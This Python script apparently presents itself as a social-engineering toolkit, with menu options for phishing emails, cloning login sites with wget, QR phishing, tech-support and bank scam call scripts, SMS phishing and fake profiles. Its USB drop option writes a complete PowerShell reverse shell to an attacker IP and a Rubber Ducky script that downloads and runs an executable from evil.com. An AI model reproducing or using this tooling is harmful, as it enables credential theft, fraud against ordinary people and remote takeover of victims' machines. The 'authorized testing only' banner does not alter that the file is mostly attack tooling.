#!/usr/bin/env python3

import os

import sys

import random

import smtplib

import socket

import subprocess

import time

from email.mime.text import MIMEText

from email.mime.multipart import MIMEMultipart

import requests

import qrcode

from faker import Faker

import phonenumbers

from phonenumbers import carrier

import pyfiglet

from termcolor import colored



# Initialize Faker for fake data generation

fake = Faker()



# Banner

def show_banner():

banner = pyfiglet.figlet_format("SEToolkit", font="slant")

print(colored(banner, 'red'))

print(colored("Social Engineering Toolkit (Termux Edition)", 'yellow'))

print(colored("For authorized penetration testing only!\n", 'cyan'))



# Main Menu

def main_menu():

while True:

show_banner()

print(colored("[1] Phishing Email Generator", 'green'))

print(colored("[2] Fake Website Cloner", 'green'))

print(colored("[3] QR Code Phishing", 'green'))

print(colored("[4] Vishing Call Simulator", 'green'))

print(colored("[5] USB Drop Attack Generator", 'green'))

print(colored("[6] Smishing Tool (SMS Phishing)", 'green'))

print(colored("[7] Social Media Impersonation", 'green'))

print(colored("[0] Exit", 'red'))



choice = input("\nSelect an option: ")



if choice == "1":

phishing_email()

elif choice == "2":

fake_website()

elif choice == "3":

qr_phishing()

elif choice == "4":

vishing_simulator()

elif choice == "5":

usb_drop()

elif choice == "6":

smishing_tool()

elif choice == "7":

social_impersonation()

elif choice == "0":

print(colored("\n[!] Exiting... Stay ethical!", 'red'))

sys.exit()

else:

print(colored("\n[!] Invalid choice. Try again.", 'red'))

time.sleep(1)



# [1] Phishing Email Generator

def phishing_email():

print(colored("\n=== Phishing Email Generator ===", 'blue'))

print(colored("Choose a template:", 'yellow'))

print("[1] HR Policy Update")

print("[2] Password Reset")

print("[3] Invoice Payment")

print("[4] Custom Email")



template = input("\nSelect template: ")

sender = input("Sender name (e.g., HR Department): ")

sender_email = input("Sender email (e.g., hr@company.com): ")

target_email = input("Target email: ")

subject = input("Email subject: ")



if template == "1":

body = f"""

Dear Employee,



Our HR policies have been updated. Please review and confirm your details:

{fake.url()}



Regards,

{sender}

"""

elif template == "2":

body = f"""

Urgent: Password Reset Required



Click here to reset your password:

{fake.url()}



- IT Support

"""

elif template == "3":

body = f"""

Invoice #{random.randint(1000,9999)} Pending



Please review the attached invoice:

{fake.url()}



- Accounts Team

"""

else:

body = input("Enter custom email body: ")



# Send email (simulated)

print(colored("\n[+] Email crafted successfully!", 'green'))

print(colored(f"From: {sender} <{sender_email}>", 'cyan'))

print(colored(f"To: {target_email}", 'cyan'))

print(colored(f"Subject: {subject}", 'cyan'))

print(colored(f"Body:\n{body}", 'cyan'))



input("\nPress Enter to return to menu...")



# [2] Fake Website Cloner

def fake_website():

print(colored("\n=== Fake Website Cloner ===", 'blue'))

url = input("Enter URL to clone (e.g., https://login.microsoft.com): ")

output_dir = input("Output directory name: ")



print(colored("\n[+] Cloning website...", 'yellow'))

os.system(f"wget -mkEpnp {url} -P {output_dir}")



print(colored("\n[+] Website cloned successfully!", 'green'))

print(colored(f"Saved to: {output_dir}", 'cyan'))



# Simulate credential harvesting

print(colored("\n[+] Fake login page ready for phishing!", 'yellow'))

input("\nPress Enter to return to menu...")



# [3] QR Code Phishing

def qr_phishing():

print(colored("\n=== QR Code Phishing ===", 'blue'))

url = input("Enter phishing URL (e.g., https://evil.com/login): ")

output_file = input("Output filename (e.g., qr_phish.png): ")



qr = qrcode.QRCode(version=1, box_size=10, border=5)

qr.add_data(url)

qr.make(fit=True)

img = qr.make_image(fill='black', back_color='white')

img.save(output_file)



print(colored("\n[+] QR Code generated successfully!", 'green'))

print(colored(f"Saved as: {output_file}", 'cyan'))

input("\nPress Enter to return to menu...")



# [4] Vishing Call Simulator

def vishing_simulator():

print(colored("\n=== Vishing Call Simulator ===", 'blue'))

number = input("Target phone number (e.g., +1234567890): ")

script = input("Choose script:\n[1] Tech Support\n[2] Bank Verification\nChoice: ")



if script == "1":

message = "Hello, this is Microsoft Support. Your PC has a virus. Press 1 to connect."

else:

message = "This is your bank. Unusual activity detected. Press 1 to verify."



print(colored("\n[+] Call initiated (simulated)", 'yellow'))

print(colored(f"Calling: {number}", 'cyan'))

print(colored(f"Script: {message}", 'cyan'))

input("\nPress Enter to return to menu...")



# [5] USB Drop Attack Generator

def usb_drop():

print(colored("\n=== USB Drop Attack Generator ===", 'blue'))

payload = input("Payload type:\n[1] PowerShell Reverse Shell\n[2] Rubber Ducky Script\nChoice: ")

output = input("Output file (e.g., /dev/sdb1 or payload.txt): ")



if payload == "1":

with open(output, 'w') as f:

f.write("powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"")

else:

with open(output, 'w') as f:

f.write("DELAY 1000\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 1000\nSTRING powershell -w hidden -c \"(New-Object System.Net.WebClient).DownloadFile('http://evil.com/payload.exe','%TEMP%\\payload.exe'); Start-Process '%TEMP%\\payload.exe'\"\nENTER")



print(colored("\n[+] Payload generated!", 'green'))

print(colored(f"Saved to: {output}", 'cyan'))

input("\nPress Enter to return to menu...")



# [6] Smishing Tool

def smishing_tool():

print(colored("\n=== Smishing Tool (SMS Phishing) ===", 'blue'))

number = input("Target phone number (e.g., +1234567890): ")

message = input("Phishing message (e.g., 'Your package is delayed: https://bit.ly/track-123'): ")



print(colored("\n[+] SMS sent (simulated)", 'yellow'))

print(colored(f"To: {number}", 'cyan'))

print(colored(f"Message: {message}", 'cyan'))

input("\nPress Enter to return to menu...")



# [7] Social Media Impersonation

def social_impersonation():

print(colored("\n=== Social Media Impersonation ===", 'blue'))

profile_url = input("Enter profile URL to clone (e.g., LinkedIn): ")

fake_profile = fake.profile()



print(colored("\n[+] Fake profile generated:", 'green'))

print(colored(f"Name: {fake_profile['name']}", 'cyan'))

print(colored(f"Job: {fake.job()}", 'cyan'))

print(colored(f"Fake Login Page: {fake.url()}", 'cyan'))

input("\nPress Enter to return to menu...")



# Run

if __name__ == "__main__":

try:

main_menu()

except KeyboardInterrupt:

print(colored("\n[!] Exiting... Stay ethical!", 'red'))

sys.exit()